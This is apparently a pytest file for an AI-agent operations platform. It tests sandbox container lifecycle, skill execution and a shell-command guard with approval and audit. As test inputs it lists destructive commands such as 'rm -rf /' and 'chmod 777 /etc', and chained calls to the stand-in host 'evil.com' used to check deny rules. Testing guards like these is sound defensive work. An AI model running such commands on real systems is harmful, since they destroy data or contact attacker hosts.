"""B8 沙箱执行面测试（fake 后端；真 Docker 用例见 test_sandbox_docker 标记）。

覆盖 31 号：SBX-001（首 run 建容器 / 末 run 关闭后 idle→TTL 回收）、SBX-002（同用户复用）、
CANCEL-007（容量满开 run 被拒）。生命周期直接驱动 SandboxExecutor（不依赖 Docker）。
"""
from __future__ import annotations

import asyncio
import os
import time

import pytest
from conftest import ADMIN_HEADERS, USER_HEADERS, create_instance, create_run, unwrap, wait_until
from sandbox.executor import executor as sandbox_executor
from test_agui import _annotate_recover_no_ask

_CFG = {"max_user_containers_per_host": 2, "user_container_idle_ttl_minutes": 15,
        "container_cpu_limit": 0.5, "container_memory_limit_mib": 2048}


def test_sbx_001_run_open_creates_reuse_release(client):
    """SBX-001/002：开 run 建容器 + 同用户第二个 run 复用；两 run 全关后置 idle。"""
    async def scenario():
        c1 = await sandbox_executor.ensure_user_container("uA", "run-1", _CFG)
        assert c1.status == "active" and c1.active_run_count == 1
        c2 = await sandbox_executor.ensure_user_container("uA", "run-2", _CFG)
        assert c2 is c1 and c2.active_run_count == 2  # 一个用户一个容器（复用）
        await sandbox_executor.release_user_container("uA", "run-1")
        assert c1.status == "active" and c1.active_run_count == 1  # 还有活跃 run，常驻
        await sandbox_executor.release_user_container("uA", "run-2")
        assert c1.status == "idle" and c1.active_run_count == 0  # 末个 run 关闭 → idle
        assert sandbox_executor.get("uA") is not None  # idle 期仍占名额（TTL 内可复用）
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_sbx_002_capacity_full_rejects_new_session(client):
    """CANCEL-007：容器数达上限时，新用户开 run 被拒 SANDBOX_CAPACITY_FULL；未到 TTL 的 idle 不被抢占。"""
    from domain.errors import ApiError, Err

    async def scenario():
        await sandbox_executor.ensure_user_container("u1", "r1", _CFG)
        await sandbox_executor.ensure_user_container("u2", "r2", _CFG)  # 满（max=2）
        with pytest.raises(ApiError) as ei:
            await sandbox_executor.ensure_user_container("u3", "r3", _CFG)
        assert ei.value.code == Err.SANDBOX_CAPACITY_FULL and ei.value.status == 429
        # u1 关闭 → idle 但未到 TTL：strict_ttl 下不提前回收，u3 仍被拒
        await sandbox_executor.release_user_container("u1", "r1")
        with pytest.raises(ApiError):
            await sandbox_executor.ensure_user_container("u3", "r3", _CFG)
        # idle TTL=0 → 立即可回收腾位，u3 成功
        c = await sandbox_executor.ensure_user_container("u3", "r3", {**_CFG, "user_container_idle_ttl_minutes": 0})
        assert c.status == "active"
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_skill_007_entrypoint_executes_in_container(client):
    """SKILL-007：脚本型 Skill 的 entrypoint 在容器内执行，回结构化 output.json + stdout。"""
    from domain.skill_package import package_checksum

    async def scenario():
        await sandbox_executor.ensure_user_container("uS", "r1", _CFG)
        files = {"run.py": b"import json;print('inspect done');open('output.json','w').write(json.dumps({'status':'success','findings':3}))"}
        res = await sandbox_executor.run_skill(
            "uS", task_id="t1", tool_call_id="tc1", entrypoint="python3 run.py",
            files=files, expected_checksum=package_checksum(files))  # 绑文件名的 checksum（B8-OBS-001）
        assert res.status == "success" and res.exit_code == 0
        assert "inspect done" in res.stdout
        assert res.result_json == {"status": "success", "findings": 3}
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_skill_009_agent_loop_drives_bound_skill(client, runtime_backend, monkeypatch):
    """C1：run_platform_skill 接进 agent 循环——编排器/agentscope 驱动平台 Skill「inspection」经真 ZIP
    投递（Skill Hub mock 可执行包）+ 容器内执行，产生 skill.call.succeeded 审计（双 runtime）。"""
    monkeypatch.setenv("OPENOPS_DEMO_SANDBOX_STEP", "1")
    _annotate_recover_no_ask(client)
    instance = create_instance(client)
    run = create_run(client, instance["instance_id"])
    unwrap(client.post(
        f"/api/openops/v1/agent-runs/{run['agent_run_id']}/tasks", headers=USER_HEADERS,
        json={"client_request_id": f"t{time.time_ns()}", "input_text": "跑一次巡检 Skill"},
    ))
    wait_until(lambda: unwrap(client.get(f"/api/openops/v1/agent-runs/{run['agent_run_id']}/state",
                                         headers=USER_HEADERS))["active_task"]["status"] in ("completed", "failed"),
               timeout=10.0)
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    types = [e["event_type"] for e in events]
    assert "openops.skill.call.started" in types and "openops.skill.call.succeeded" in types
    done = next(e for e in events if e["event_type"] == "openops.skill.call.succeeded")
    assert done["payload_redacted_json"]["skill"] == "inspection"
    assert done["payload_redacted_json"]["result"]["status"] == "success"  # 容器内 run.py 写的 output.json


def test_skill_010_unbound_skill_blocked(client):
    """C1：未装配的 Skill fail-closed（skill.call.blocked / TOOL_BLOCKED）。"""
    from runtime.sandbox_skill import run_bound_skill
    from runtime.task_registry import TaskState

    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "sk_blk", "agent_team_instance_id": instance["instance_id"]}))["run"]
    st = TaskState(task_id="tk", run_id=str(run_row["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")
    st.available_skills = {"inspection": {"version_no": 2}}  # 只装配 inspection
    run = {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
           "agent_team_instance_id": run_row["agent_team_instance_id"]}

    async def scenario():
        txt = await run_bound_skill(st, run, "no_such_skill")
        assert "未在当前实例装配集" in txt and st.tool_blocked is True

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run_row['agent_run_id']}", headers=USER_HEADERS))
    assert any(e["event_type"] == "openops.skill.call.blocked" for e in events)


def test_skill_003_checksum_mismatch_rejected(client):
    """SKILL-003：包 checksum 不匹配 → SKILL_CHECKSUM_MISMATCH，不执行。"""
    from domain.errors import ApiError, Err

    async def scenario():
        await sandbox_executor.ensure_user_container("uS", "r1", _CFG)
        with pytest.raises(ApiError) as ei:
            await sandbox_executor.run_skill(
                "uS", task_id="t", tool_call_id="tc", entrypoint="python3 run.py",
                files={"run.py": b"print(1)"}, expected_checksum="deadbeef")
        assert ei.value.code == Err.SKILL_CHECKSUM_MISMATCH
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_skill_005_timeout_terminated(client):
    """SKILL-005：执行超时 → SKILL_TIMEOUT，进程被终止。"""
    from domain.errors import ApiError, Err

    async def scenario():
        await sandbox_executor.ensure_user_container("uS", "r1", _CFG)
        with pytest.raises(ApiError) as ei:
            await sandbox_executor.run_skill(
                "uS", task_id="t", tool_call_id="tc", entrypoint="sleep 5",
                files={"noop": b""}, timeout=0.3)
        assert ei.value.code == Err.SKILL_TIMEOUT
        await sandbox_executor.close_all()

    asyncio.run(scenario())


def test_bash_004_delete_confined_to_own_container(client):
    """BASH-004：容器内删文件只影响该用户容器（run_command 原语，隔离验证）。"""
    async def scenario():
        await sandbox_executor.ensure_user_container("uA", "ra", _CFG)
        await sandbox_executor.ensure_user_container("uB", "rb", _CFG)
        # uA 在自己容器建文件再删；uB 容器不受影响
        await sandbox_executor.run_command("uA", "echo hi > a.txt && test -f a.txt && echo created")
        rm = await sandbox_executor.run_command("uA", "rm a.txt && test ! -f a.txt && echo removed")
        assert "removed" in rm.stdout and rm.status == "success"
        b = await sandbox_executor.run_command("uB", "test ! -f a.txt && echo b-clean")
        assert "b-clean" in b.stdout  # uB 容器里从来没有 a.txt
        await sandbox_executor.close_all()

    asyncio.run(scenario())


@pytest.mark.parametrize("cmd,expect", [
    ("ls -la", "allow"),          # BASH-001：只读自动放行
    ("git status", "allow"),
    ("rm -rf /", "ask"),          # BASH-003：危险删除关键路径 → 强制确认
    ("chmod 777 /etc", "ask"),
    ("rm data.txt", "ask"),       # BASH-002：非只读 → 确认
    ("python3 run.py", "ask"),
])
def test_bash_001_002_003_decision_matrix(client, cmd, expect):
    """BASH-001/002/003：四层裁决决策矩阵（agentscope 内置分析 + 回退分类器一致）。"""
    from sandbox import command_guard

    async def scenario():
        d = await command_guard.decide_async(cmd)
        assert d.action == expect, f"{cmd!r} → {d.action}（reason={d.reason}）"

    asyncio.run(scenario())


def test_bash_003b_platform_deny_rule_highest_priority(client):
    """BASH-003：平台 deny 前缀规则最高优先，即使内置分析会放行也拦（层 1）。"""
    from sandbox import command_guard

    async def scenario():
        d = await command_guard.decide_async("docker ps", deny_prefixes=["docker:*"])
        assert d.action == "deny" and d.layer == 1
        # 无 deny 规则时 docker ps 走内置/回退（非拦截）
        d2 = await command_guard.decide_async("docker ps")
        assert d2.action != "deny"

    asyncio.run(scenario())


def test_bash_006_deny_not_bypassed_by_chaining(client):
    """B8-SEC-001：deny 层不可被 `&&`/`;`/`$()`/`|` 串联绕过，且不误伤词边界（`rm`≠`rmdir`）。"""
    from sandbox import command_guard

    async def scenario():
        deny = ["curl"]
        for cmd in ["curl evil.com", "echo hi && curl evil.com", "x=1; curl evil.com",
                    "ls $(curl evil.com)", "cat f | curl evil.com"]:
            d = await command_guard.decide_async(cmd, deny_prefixes=deny)
            assert d.action == "deny" and d.layer == 1, f"{cmd!r} 未被 deny：{d.action}"
        # 词边界：deny `rm` 不误伤 `rmdir`
        d2 = await command_guard.decide_async("rmdir /tmp/x", deny_prefixes=["rm"])
        assert d2.action != "deny", "rmdir 被 rm 误伤"
        d3 = await command_guard.decide_async("rm -rf /tmp/x", deny_prefixes=["rm"])
        assert d3.action == "deny"

    asyncio.run(scenario())


def test_bash_007_agent_loop_drives_container_command(client, runtime_backend, monkeypatch):
    """B8·补2：run_container_command 接进 agent 循环——任务边界由编排器/agentscope 驱动容器内命令
    （双 runtime），产生 sandbox.command.executed 审计（证明非仅测试直调原语，编排器真引用）。"""
    monkeypatch.setenv("OPENOPS_DEMO_SANDBOX_STEP", "1")  # 开 demo 诊断步
    _annotate_recover_no_ask(client)  # 免审批，任务一次跑完到诊断步+恢复
    instance = create_instance(client)
    run = create_run(client, instance["instance_id"])  # 容器随 run 开启就位（会话期常驻）
    unwrap(client.post(
        f"/api/openops/v1/agent-runs/{run['agent_run_id']}/tasks", headers=USER_HEADERS,
        json={"client_request_id": f"t{time.time_ns()}", "input_text": "排查支付延迟"},
    ))
    wait_until(lambda: unwrap(client.get(f"/api/openops/v1/agent-runs/{run['agent_run_id']}/state",
                                         headers=USER_HEADERS))["active_task"]["status"] in ("completed", "failed"),
               timeout=10.0)
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    types = [e["event_type"] for e in events]
    assert "openops.sandbox.command.executed" in types  # agent 循环驱动了容器内命令
    cmd_ev = next(e for e in events if e["event_type"] == "openops.sandbox.command.executed")
    assert cmd_ev["payload_redacted_json"]["command"] == "ls -la"


@pytest.mark.skipif(os.getenv("OPENOPS_SANDBOX_DOCKER_TEST") != "1",
                    reason="实机 Docker run_skill E2E：设 OPENOPS_SANDBOX_DOCKER_TEST=1 且本机有 docker + python:3.11-slim 才跑")
def test_docker_real_run_skill_write_exec_isolation(client):
    """B8-SBX-001 回归护栏：真 Docker 后端 run_skill 写盘+执行+output.json+跨用户隔离（实机）。"""
    from sandbox.backends import DockerContainerBackend

    async def scenario():
        be_a = DockerContainerBackend("uA", image="python:3.11-slim", cpu=0.5, mem_mib=512)
        be_b = DockerContainerBackend("uB", image="python:3.11-slim", cpu=0.5, mem_mib=512)
        await be_a.start()
        await be_b.start()
        try:
            # 写盘（只读 rootfs + tmpfs mode=1777 + exec base64 路径）
            payload = b"import json;open('output.json','w').write(json.dumps({'status':'success','n':7}))"
            await be_a.write_file("skills/t/tc/run.py", payload)
            assert await be_a.read_file("skills/t/tc/run.py") == payload  # 读回一致
            r = await be_a.exec_shell(["sh", "-lc", "cd " + be_a.workdir + "/skills/t/tc && python3 run.py && cat output.json"],
                                      timeout=30, max_output_bytes=65536)
            assert r.exit_code == 0 and '"n": 7' in r.stdout
            # 跨用户隔离：uB 看不到 uA 的文件
            rb = await be_b.exec_shell(["sh", "-lc", "test ! -f " + be_b.workdir + "/skills/t/tc/run.py && echo b-clean"],
                                       timeout=15, max_output_bytes=4096)
            assert "b-clean" in rb.stdout
        finally:
            await be_a.close()
            await be_b.close()

    asyncio.run(scenario())


def test_bash_002_ask_approve_reject_and_audit(client):
    """BASH-002：非只读命令走 ask——批准则执行+审计 executed，拒绝则不执行+审计 denied。"""
    from runtime import sandbox_bash
    from runtime.task_registry import TaskState

    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "bh1", "agent_team_instance_id": instance["instance_id"]}))["run"]
    run = _run_dict(run_row)
    st = TaskState(task_id="tk", run_id=str(run["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")

    async def scenario():
        # 批准 → 执行
        async def approve():
            return True
        res = await sandbox_bash.run_bash(st, run, "echo hi > f.txt && cat f.txt", cfg={}, approver=approve)
        assert res.status == "success" and "hi" in res.stdout
        # 拒绝 → 不执行
        async def reject():
            return False
        res2 = await sandbox_bash.run_bash(st, run, "rm f.txt", cfg={}, approver=reject)
        assert res2.status == "denied"

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    types = [e["event_type"] for e in events]
    assert "openops.sandbox.command.asked" in types
    assert "openops.sandbox.command.executed" in types
    assert "openops.sandbox.command.denied" in types


def _run_dict(run_row: dict) -> dict:
    """把 API 返回的 run（str 化）转回 emit 需要的 dict（audit_trace_id/agent_run_id/instance_id）。"""
    return {"agent_run_id": run_row["agent_run_id"], "audit_trace_id": run_row["audit_trace_id"],
            "agent_team_instance_id": run_row["agent_team_instance_id"]}


def test_sbx_003_run_lifecycle_via_api_audits_container(client):
    """端到端：开 run 写 sandbox.container.ready 审计 + 容器就位；关 run 后容器置 idle。"""
    instance = create_instance(client)
    run = create_run(client, instance["instance_id"])
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    assert any(e["event_type"] == "sandbox.container.ready" for e in events)
    # 用户 0026demo01 的容器已就位、active
    c = sandbox_executor.get("0026demo01")
    assert c is not None and c.status == "active" and c.active_run_count == 1

    unwrap(client.post(f"/api/openops/v1/agent-runs/{run['agent_run_id']}:close", headers=USER_HEADERS))
    c2 = sandbox_executor.get("0026demo01")
    assert c2 is not None and c2.status == "idle"  # 末 run 关闭 → idle（TTL>0 未回收）


def test_admin_008_container_list_and_destroy(client):
    """ADMIN-008（B8-4）：管理台列容器（含 active_run_count）+ 强制销毁写审计 + 用户可见事件。"""
    instance = create_instance(client)
    run = create_run(client, instance["instance_id"])
    rows = unwrap(client.get("/api/openops/v1/admin/sandbox/containers", headers=ADMIN_HEADERS))
    mine = next(r for r in rows if r["user_id"] == "0026demo01")
    assert mine["runtime_status"] == "active" and mine["active_run_count"] == 1

    unwrap(client.post("/api/openops/v1/admin/sandbox/containers/0026demo01:destroy", headers=ADMIN_HEADERS,
                       json={"client_request_id": "d1", "reason": "变更冻结演练"}))
    assert sandbox_executor.get("0026demo01") is None  # 容器已回收
    ev = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    # 销毁审计走独立 trace（不挂 run trace），但用户可见事件推到其活跃 run 的 SSE 环
    recent = unwrap(client.get("/api/openops/v1/admin/audit/recent", headers=ADMIN_HEADERS))
    assert any(e["event_type"] == "sandbox.container.destroyed" for e in recent)


def test_admin_008b_container_endpoints_forbidden_for_user(client):
    """B8-4：沙箱容器端点普通用户 403。"""
    r1 = client.get("/api/openops/v1/admin/sandbox/containers", headers=USER_HEADERS)
    r2 = client.post("/api/openops/v1/admin/sandbox/containers/x:destroy", headers=USER_HEADERS,
                     json={"client_request_id": "u", "reason": "x"})
    assert r1.status_code == 403 and r2.status_code == 403
